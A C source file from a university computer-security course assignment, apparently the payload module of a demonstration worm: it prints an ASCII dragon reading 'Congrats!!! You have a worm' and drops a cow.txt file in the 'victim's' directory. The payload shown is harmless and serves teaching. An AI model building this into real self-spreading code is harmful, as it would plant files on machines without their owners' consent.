//-------------------------------------------------------------------//
// UNIVERSIDADE FEDERAL DO PARANÁ                                    //
// HENRIQUE HEPP						     //
// KATHERYNE LOUISE GRAF     					     //
// CI301 - INTRODUÇÃO À SEGURANÇA COMPUTACIONAL                      //
//-------------------------------------------------------------------//
// BIBLIOTECAS
//-------------------------------------------------------------------//
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
//-------------------------------------------------------------------//
// FUNÇÕES
//-------------------------------------------------------------------//
// Função que escreve o dragão na tela

void printcow(){
    int i;

    printf("< Congrats!!! You have a worm >\n");
    printf("   \\                    / \\  //\\\n");
    printf("     \\    |\\___/|      /   \\//  \\\\\n");
    printf("          /0  0  \\__  /    //  | \\ \\ \n"); 
    printf("         /     /  \\/_/    //   |  \\  \\  \n");
    printf("         @_^_@'/   \\/_   //    |   \\   \\ \n");
    printf("         //_^_/     \\/_ //     |    \\    \\\n");
    printf("      ( //) |        \\///      |     \\     \\\n");
    printf("    ( / /) _|_ /   )  //       |      \\     _\\\n");
    printf("  ( // /) '/,_ _ _/  ( ; -.    |    _ _\\.-~        .-~~~^-.\n");
    printf("(( / / )) ,-{        _      `-.|.-~-.           .~         `.\n");
    printf("(( // / ))  '/\\      /                 ~-. _ .-~      .-~^-.  \\\n");
    printf("(( /// ))      `.   {            }                   /      \\  \\\n");
    printf("(( / ))     .----~-.\\        \\-'                 .~         \\  `. \\^-.\n");
    printf("           ///.----..>        \\             _ -~             `.  ^-`  ^-_\n");
    printf("             ///-._ _ _ _ _ _ _}^ - - - - ~                     ~-- ,.-~\n");
    printf("                                                                /.-~\n");

}
//-------------------------------------------------------------------//
// Esta função é o "main" do payload
// Nela é gerada o arquivo com o drgaão que será criado no diretório 
// da vitima e onde é chamada a função para escrever o dragão na tela

void payload(){
    int i;
    FILE *input, *output;

    input = fopen("cow.txt", "r");
    if(input == NULL){
        printcow();
        output = fopen("cow.txt", "w");
	fprintf(output,"< Congrats!!! You have a worm >\n");
    	fprintf(output,"   \\                    / \\  //\\\n");
    	fprintf(output,"     \\    |\\___/|      /   \\//  \\\\\n");
    	fprintf(output,"          /0  0  \\__  /    //  | \\ \\ \n"); 
    	fprintf(output,"         /     /  \\/_/    //   |  \\  \\  \n");
    	fprintf(output,"         @_^_@'/   \\/_   //    |   \\   \\ \n");
    	fprintf(output,"         //_^_/     \\/_ //     |    \\    \\\n");
    	fprintf(output,"      ( //) |        \\///      |     \\     \\\n");
    	fprintf(output,"    ( / /) _|_ /   )  //       |      \\     _\\\n");
    	fprintf(output,"  ( // /) '/,_ _ _/  ( ; -.    |    _ _\\.-~        .-~~~^-.\n");
    	fprintf(output,"(( / / )) ,-{        _      `-.|.-~-.           .~         `.\n");
    	fprintf(output,"(( // / ))  '/\\      /                 ~-. _ .-~      .-~^-.  \\\n");
    	fprintf(output,"(( /// ))      `.   {            }                   /     \\  \\\n");
    	fprintf(output,"(( / ))     .----~-.\\        \\-'                 .~        \\  `. \\^-.\n");
    	fprintf(output,"           ///.----..>        \\             _ -~             `.  ^-`  ^-_\n");
    	fprintf(output,"             ///-._ _ _ _ _ _ _}^ - - - - ~                     ~-- ,.-~\n");
    	fprintf(output,"                                                                /.-~\n");
    }else{    
        printcow();
    }        
  
}
